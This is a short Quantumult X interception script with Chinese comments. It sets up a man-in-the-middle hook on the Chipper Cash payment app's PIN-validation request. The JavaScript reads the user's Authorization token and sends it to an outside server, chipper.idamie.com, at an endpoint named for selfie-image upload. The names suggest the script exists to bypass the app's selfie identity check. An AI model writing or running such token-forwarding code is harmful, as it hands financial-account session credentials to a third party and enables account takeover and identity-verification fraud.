/*
[Script]
# 拦截并处理 Token，然后发送到自定义服务器
http-request ^https:\/\/auth\.chippercash\.com\/pin\/validate script-path=https://你的服务器地址/QuantumultX/selfie_challenge.js

[MITM]
hostname = auth.chippercash.com
*/

const url = 'https://chipper.idamie.com/api/v1/upload/selfie_image';

// 固定 code 值为 "image1"
const code = "image1";

// 获取请求中的 token
const request = $request;
const token = request.headers['Authorization'] || '';

if (!token) {
  // 如果没有找到 token，发送通知
  $notify('Token Missing', 'No token found in the request headers', '');
  $done({});  // 放行请求
} else {
  // 准备发送到服务器的 POST 请求
  const headers = {
    'Content-Type': 'application/json',
    'Authorization': token,
    'code': code  // 使用固定的 code 值 "image1"
  };

  const body = {};

  // 发送 POST 请求到服务器
  $httpClient.post(
    {
      url: url,
      headers: headers,
      body: JSON.stringify(body)
    },
    function (error, response, data) {
      if (error) {
        // 处理请求错误
        $notify('Request Error', 'Error occurred while sending the request', error);
      } else {
        try {
          const jsonData = JSON.parse(data);
          if (jsonData.address) {
            // 发送通知显示地址
            $notify('Success', 'Address retrieved successfully', jsonData.address);
          } else if (jsonData.error) {
            // 处理返回的错误信息
            $notify('Error', 'Error occurred on the server side', jsonData.error);
          } else {
            $notify('Unexpected Response', 'The response did not contain the expected data.', '');
          }
        } catch (e) {
          // 处理 JSON 解析错误
          $notify('Response Error', 'Failed to parse the response', e.message);
        }
      }
      $done({});  // 放行请求
    }
  );
}
